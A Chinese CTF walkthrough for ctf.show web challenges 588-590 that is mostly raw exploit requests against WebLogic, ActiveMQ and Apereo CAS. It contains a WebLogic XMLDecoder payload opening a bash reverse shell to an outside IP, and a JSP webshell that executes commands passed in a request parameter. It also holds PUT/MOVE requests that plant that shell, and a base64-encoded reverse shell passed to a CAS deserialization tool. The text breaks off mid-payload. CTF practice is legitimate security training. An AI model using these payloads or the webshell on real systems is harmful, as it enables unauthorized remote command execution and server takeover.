<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b616c0fd-d72b-4856-9084-b3de8997f324.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>204</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/156.238.233.9/9999 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="web588"><a href="#web588" class="headerlink" title="web588"></a>web588</h2><p>CVE-2018-2894，首先弱密码登录<code>admin\admin</code>，WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为<code>/ws_utc/begin.do</code>，<code>/ws_utc/config.do</code>，先访问<code>/ws_utc/config.do</code>把工作目录改成无需权限的CSS目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure>

<p>设置-》安全，上传木马<code>shell.jsp</code>，获得时间戳</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">	java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span>Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">	<span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">	<span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">	out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">		out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line"> 	&#125;</span><br><span class="line">	out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>得到回显时间戳，然后访问即可RCE<code>/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，这里用ctfshow开半天开不了，直接用<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">vulhub </a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/weblogic/CVE-2018-2894</span><br><span class="line">docker compose up -d</span><br><span class="line">docker logs 901bc1758d76</span><br><span class="line"></span><br><span class="line">admin password  : [rCMtK9ai]</span><br><span class="line">admin name      : [AdminServer]</span><br><span class="line">admin username  : [weblogic]</span><br></pre></td></tr></table></figure>

<p>然后后面就是跟着复现就可以了</p>
<h2 id="web589"><a href="#web589" class="headerlink" title="web589"></a>web589</h2><p>CVE-2016-3088 访问<code>/admin/test/systemProperties.jsp</code>，一样的<code>admin\admin</code>，查看ActiveMQ的绝对路径<code>activemq.home</code>为<code>/opt/activemq</code>，那开始上传文件，首先是生成shell的包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e94341b0-9cfb-478e-90db-92ff36182c2a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span></span><br><span class="line"><span class="language-gradle">	java.io.InputStream in =<span class="keyword">Runtime</span>.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">int</span> a = -<span class="number">1</span>;</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span></span><br><span class="line"><span class="language-gradle">	out.<span class="keyword">print</span>(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">while</span>((a=in.<span class="keyword">read</span>(b))!=-<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-gradle">		out.<span class="keyword">println</span>(<span class="keyword">new</span> String(b));</span></span><br><span class="line"><span class="language-gradle"> 	&#125;</span></span><br><span class="line"><span class="language-gradle">	out.<span class="keyword">print</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"> &#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>

<p>响应包状态码为204则是成功了，再把shell移动到绝对路径下面来供我们使用</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e94341b0-9cfb-478e-90db-92ff36182c2a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/api/shell.jsp</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问<code>/api/shell.jsp?pwd=023&amp;i=cat /root/flag</code></p>
<h2 id="web590"><a href="#web590" class="headerlink" title="web590"></a>web590</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/Apereo-CAS-Attack/releases">工具</a> Apereo CAS 4.1反序列化RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTYuMjM4LjIzMy45Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cas/login;jsessionid=1CB1647A3EDE62304C1E4F9DF9206701?locale=zh_CN</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7fcaa321-4d4a-4757-a142-a0897ccfe0da.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1296</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://7fcaa321-4d4a-4757-a142-a0897ccfe0da.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://7fcaa321-4d4a-4757-a142-a0897ccfe0da.challenge.ctf.show/cas/login?locale=zh_CN</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=1CB1647A3EDE62304C1E4F9DF9206701; cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=zh_CN</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">username<span class="operator">=</span>admin&amp;password<span class="operator">=</span>admin&amp;lt<span class="operator">=</span>LT<span class="number">-2</span>-tZDMa<span class="number">7</span>fNVBP<span class="number">3</span>t<span class="number">3</span>w<span class="number">9</span>QRaAUdKx<span class="number">1</span>Cx<span class="number">93</span>r-cas<span class="number">01</span>.example.org&amp;execution<span class="operator">=</span>abff<span class="number">7780</span>-<span class="keyword">c</span><span class="number">0</span>d<span class="number">5</span><span class="number">-4</span><span class="keyword">c</span><span class="number">1</span><span class="keyword">c</span><span class="number">-812e-9</span>ee<span class="number">4</span>f<span class="number">4e83891</span>_AAAAIgAAABCafdJt<span class="number">5</span>jXiaWLcxB<span class="number">7</span>okD<span class="number">7</span>MAAAABmFlczEyOGuCfSl<span class="variable">%2</span>BcLjGweI<span class="variable">%2</span>BGlN<span class="variable">%2</span>FZYP<span class="number">2</span>SD<span class="number">5</span>KxthOz<span class="number">1</span>r<span class="number">2</span>mQ<span class="number">8</span>BJyxjBYcG<span class="number">8</span>lMMvN<span class="number">24</span>oYr<span class="number">4</span>vLrirYHR<span class="number">4</span>WsQbSkSdUzOMBR<span class="number">91</span>hh<span class="number">0</span>twSvhdARZRlHXv<span class="number">39</span>ZfuJv<span class="number">9</span>P<span class="number">53</span>YROthhtgAtMYtsehYiVJozuYcb<span class="number">8</span>PDfWJjMTuVS<span class="number">8</span><span class="variable">%2</span>Bul<span class="variable">%2</span>Ff<span class="number">06</span>J<span class="number">4</span>sQ<span class="number">2</span>b<span class="number">0</span>UxL<span class="number">2</span>XqFu<span class="number">7</span>MVa<span class="number">0</span>Jks<span class="variable">%2</span>BKCaY<span class="number">6</span><span class="variable">%2</span>FjqMnHXsJ<span class="number">2</span>DbJ<span class="number">0</span>T<span class="number">3</span><span class="variable">%2</span>FAArtYVfQ<span class="number">9</span>jT<span class="number">56</span>in<span class="number">4</span>y<span class="number">1</span>SKOLVlAQKybuhyQx<span class="number">3</span>f<span class="number">3</span>no<span class="number">0</span>ApkartJORTM<span class="number">4529</span>crv<span class="number">4</span>g<span class="variable">%2</span>B<span class="number">6</span>vdDZo<span class="variable">%2</span>BJK<span class="number">5</span>mjzq<span class="number">4</span>G<span class="number">4</span>q<span class="number">2</span>GYWMWeyUHMFV<span class="number">8</span>GKkJAElDGjgU<span class="number">2</span>Fgh<span class="number">4</span>C<span class="number">4</span>h<span class="number">2</span>Qg<span class="number">0</span>NAPA<span class="number">2</span>tnrH<span class="variable">%2</span>BW<span class="number">2</span>U<span class="number">0</span>yin<span class="variable">%2</span>F<span class="number">9</span>TILzw<span class="number">8</span>Hzuos<span class="number">8</span>esX<span class="variable">%2</span>BaQq<span class="number">9</span>oHPNIxiBCi<span class="number">5</span>zeFjwGsAeirwFRbxvAh<span class="number">6</span>Wyc<span class="number">7</span>QYvzfKPbmuPCFOnkK<span class="number">55</span>mSWHEvvazG<span class="number">7</span>bY<span class="number">5</span>AZxLYzrLNI<span class="number">78</span>kCO<span class="number">204</span>IwKgkx<span class="number">1</span>MXCIxmyfNpa<span class="variable">%2</span>BhRmnmFmMyW<span class="variable">%2</span>FpuUQUJmhwjRxwctDu<span class="variable">%2</span>FKETnzPN<span class="number">9</span>rB<span class="variable">%2</span>BWIpxKcwWFFBw<span class="number">4</span>BB<span class="number">8</span>uZyZSja<span class="number">5</span>yvNAm<span class="number">9</span>q<span class="number">1</span>o<span class="number">59</span>u<span class="number">77</span>JVaeQLbYCVPMu<span class="number">7</span>ekTrNh<span class="number">2</span>A<span class="number">6</span>jXDP<span class="number">5</span>RnXBGGVrxZPnXoQYu<span class="number">8</span>CoteNVC<span class="variable">%2</span>FU<span class="number">3</span>Y<span class="number">6</span>qrAEMnsts<span class="number">5</span>CfXd<span class="number">9</span>hMmtVvCE<span class="variable">%2</span>BgkcrJCf<span class="number">1</span>Sam<span class="number">3</span>kiY<span class="number">0</span>tWffKkd<span class="number">2</span>MmZyMga<span class="number">7</span>f<span class="number">8</span>PDP<span class="number">71</span>YsN<span class="number">8</span>GMu<span class="number">9</span>wl<span class="number">2</span>bGlNcw<span class="variable">%2</span>BQa<span class="variable">%2</span>BxyjiHDtWwf<span class="number">4</span>o<span class="variable">%2</span>BCetj<span class="number">9</span>eCJr<span class="variable">%2</span>FiiFteOpOrk<span class="number">9</span>Dg<span class="number">29</span>hOVN<span class="number">9</span>Nj<span class="variable">%2</span>FdValCF<span class="number">8</span>Vby<span class="number">1</span>G<span class="number">2</span>xoi<span class="variable">%2</span>Fq<span class="number">0</span>lm<span class="number">9</span>HD<span class="number">6</span>fD<span class="number">1</span>GmpFTjf<span class="number">5</span>Ww<span class="number">1</span>sdUnSPyDIVeUuGcH<span class="number">1</span>uEEEbFLQtylFKWq<span class="variable">%2</span>Bfypqi<span class="number">9</span>sr<span class="number">2</span>vhkHF<span class="number">01</span>mvgaufJgelk<span class="number">9</span>ZNPJislj<span class="variable">%2</span>FBWMHZVa<span class="number">7</span>zTCysDZhYulMSDMFMB<span class="number">6</span>ivRozL<span class="number">8</span>HbxLx<span class="number">2</span>cgpKyHEd<span class="variable">%2</span>BJLs<span class="number">1</span><span class="variable">%2</span>B<span class="number">2</span>cXg<span class="number">73</span>XHNvWmVPLh<span class="number">7</span>lT<span class="number">3</span><span class="variable">%2</span>B<span 